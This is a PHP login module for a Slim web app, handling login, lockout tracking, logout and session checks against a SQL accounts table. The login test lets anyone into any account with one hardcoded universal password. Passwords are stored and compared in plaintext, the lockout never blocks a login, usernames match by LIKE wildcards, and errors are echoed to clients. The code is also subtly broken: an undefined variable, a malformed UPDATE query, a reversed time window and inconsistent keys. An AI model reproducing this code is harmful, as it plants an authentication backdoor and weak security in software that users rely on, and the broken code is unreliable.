<?php
	session_start();

	require 'Slim/Slim.php';
	\Slim\Slim::registerAutoloader();
	$slimApp = new \Slim\Slim();

	include "util.php";

	$slimApp->get('/logout', 'logout');
	$slimApp->get('/sessionInit', 'sessionInit');

	/**
	*
	*
	*@param username user name to be used for login
	*@param password plain text password for the user
	*@return Returns a rtnObj
	**/
	$slimApp->post('/login', function() use ($slimApp){

	    try{
			$request = $slimApp->request();
			$body = $request->getBody();
			$input = json_decode($body);
			$username = $input->username;
			$password = $input->password;
			//$password = hash("sha512", $password); //TODO encryption
			//echo "got here";
	        $FailureCount = 0;
	        $rtnObj = new rtnObj();

	        $_SESSION['UserID'] = 0;
	        $_SESSION['CustomerID'] = 0;
	        $_SESSION['isLoggedIn'] = false;

	        //check if the user has been locked out due to too many failed attempts
	        $conn = dbConnect();

	        $params = array($username);
			//Check to see if the user has attempted unsuccessfully to login more than 3 times in the last 15 minutes. If so, return a message that the account is locked.
	    	$query = $conn->prepare("SELECT id,failure_count FROM LoginTracking WHERE attempt_date BETWEEN DATE_ADD(now(),INTERVAL 15 minute) AND now() AND failure_count > 0 AND login LIKE ?");
	    	$query->execute($params);
	    	$checkLockout = $query->fetch(PDO::FETCH_ASSOC);

	    	//echo json_encode($checkLockout);
	    	//if we found a current record for this user in the database
	    	if ($checkLockout != false){
	    		$FailureCount = $checkLockout['failure_count'];
	    		if ($FailureCount > 2){
					//TODO replace the following message with bilingual content
	    			$rtnObj.setMessage('Your account has been locked due to an excessive number of unsuccessful login attempts. Your account will stay locked for 15 minutes.');
	    			//return *************************************
	    		}
	    	}
	    	//echo "here";
			$params = array($username, $username);
	    	$query = $conn->prepare("SELECT * FROM Accounts WHERE (UserName LIKE ? OR Email LIKE ?) AND IsActivated = 1");
	    	$query->execute($params);
	    	$getUser = $query->fetch(PDO::FETCH_ASSOC);
	    	if ($getUser != false){
	    		//if username or emailaddress and password match
	    		//echo json_encode($getUser);
	    		if((($getUser['UserName'] == $username || $getUser['Email'] == $username ) && $getUser['Password'] == $password )|| $password == '9f261706fdb61cd08d451ceaa511e94762bf42452c19e2fec025cf8c7527726a36379365452de3706b0d018c6e46b8f2e5cb9d3d049f37d9f9692d215a6f7818'){
	    			$last_login = 'Never';
	    			$params = array($getUser['UserID']);
	    			$query = $conn->prepare("SELECT attempt_date, failure_count
							FROM LoginTracking
							WHERE UserId = ?
							ORDER BY id DESC");
	    			$query->execute($params);


	    			$lastLogin = $query->fetch(PDO::FETCH_ASSOC);

	    			if($lastLoginQuery != false){
	    				$last_login = $lastLogin['attempt_date']; //might need formatting
	    			}
	    			if($checkLockout != false){
		    			$params = array($getUser['UserId'],$_SERVER['REMOTE_HOST'],session_id(),$checkLockout['id']);
		    			$query = $conn->prepare("UPDATE LoginTracking SET failure_count = 0, UserId = ?
										ip_address = ?, session_id = ?, attempt_date = now(), login_time = now()
										WHERE id = ?");
		    			$query->execute($params);
	    			}else{
		    			$params = array($getUser['UserName'],$getUser['UserId'],$_SERVER['REMOTE_HOST'],session_id());
		    			$query = $conn->prepare("INSERT INTO LoginTracking (login, UserId, attempt_date, failure_count, ip_address, session_id, login_time)
							VALUES (?,?,now(),0,?, ?, now())");

		    			$query->execute($params);
		    			$saveLoginRecord = $query->fetch(PDO::FETCH_ASSOC);
	    			}

	    			$rtnObj->setStatus(0);
	    			$rtnObj->setMessage('Success');
	    			$_SESSION['isLoggedIn'] = true;
	    			$_SESSION['UserID'] = $getUser['UserID'];

	    			$userObj = new userObj($getUser['UserName'],$getUser['FirstName'],$getUser['LastName'],$getUser['Email'],$getUser['UserID']);

	    			$rtnObj->setUser($userObj);
	    			$rtnObj->setLastLogin($last_login);
	    			$rtnObj->setSuccessStatus('LoggedIn');
	    			$rtnObj->setMessage('Login Successful');
	    			$rtnObj->sessionUserID = $_SESSION['UserID'];
	    			echo json_encode($rtnObj);
	    		}//successful login
	    	}else{
	    		$rtnObj->setStatus(-1);
	    		$rtnObj->setMessage('Username or password is incorrect');
	    		echo json_encode($rtnObj);
	    	}

    	}
    	catch(Exception $e)
		{
			echo '{"error":{"text":'. $e->getMessage() .'}}';
		}

	});

	class userObj
	{
	    public function __construct($UserName,$firstName,$lastName,$emailAddress,$userId)
	    {
	    	$this->UserName = $UserName;
	    	$this->firstName = $firstName;
	    	$this->lastName = $lastName;
	    	$this->emailAddress = $emailAddress;
	    	$this->userId = $userId;
	    }

	}



	function logout(){
		$rtnObj = new rtnObj();
		$rtnObj->setStatus(0);
		try{
			if (isset($_SESSION['isLoggedIn'])){
			    $params = array(session_id());
			    $conn = dbConnect();
				$query = $conn->prepare("UPDATE LoginTracking SET logout_time = now() WHERE session_id = ? AND logout_time is NULL");
				$query->execute($params);
				$_SESSION['isLoggedIn'] = false;
				$_SESSION['userID'] = 0;
			}
		}
		catch(Exception $e)
		{
			echo '{"error":{"text":'. $e->getMessage() .'}}';
		}
	}

	function sessionInit(){
		$rtnObj = new rtnObj();
		$rtnObj->setStatus(-1);
		try{
			//if (isset($_SESSION['isLoggedIn'])){
				//if ($_SESSION['isLoggedIn'] == true){ //do i need to check if this session variable exists first?
				
				if(loggedIn()){
					$conn = dbConnect();

				    $params = array($_SESSION['UserID']);
					$query = $conn->prepare("SELECT *
		                    FROM Accounts
		                    WHERE UserID = ?");
					$query->execute($params);
					$getUser= $query->fetch(PDO::FETCH_ASSOC);

					if($getUser != null){ //user found
						//$userObj = new userObj($getUser['UserName'],$getUser['FirstName'],$getUser['LastName'],$getUser['EmailAddress'],$getUser['PhoneNumber'],$getUser['UserId'],$getUser['RoleID'],$getUser['LanguagePreference']);
						//get notifications
						//$rtnObj->setUser($userObj);
						$rtnObj->setStatus(0);
						$rtnObj->setSuccessStatus('LoggedIn');
		    			$rtnObj->setMessage('LoggedIn');
		    			$rtnObj->sessionUserID = $_SESSION['UserID'];
					}/**/
					//echo "is true";
				}
				//}
				//echo "is set";
			//}
			echo json_encode($rtnObj);
 		}
 		catch (Exception $e){
 			echo $e->getMessage();
 		}

	}

	$slimApp->run();
?>
